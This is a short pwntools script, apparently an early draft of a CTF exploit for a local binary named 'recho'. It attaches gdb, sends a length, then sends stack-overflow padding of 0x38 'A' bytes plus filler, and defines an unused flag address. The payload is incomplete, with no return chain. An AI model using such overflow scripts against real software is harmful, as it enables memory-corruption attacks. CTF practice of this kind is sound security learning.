from pwn import *
p = process("./recho")
gdb.attach("recho")
p.sendline("100")
flag = 0x000000000601058
exp = "A"*0x38+"BBBBBBBBBBBBBBBBBBBBBBB"
p.sendline(exp)
p.sendline('\x04')
#p.shutdown('send')
p.interactive()
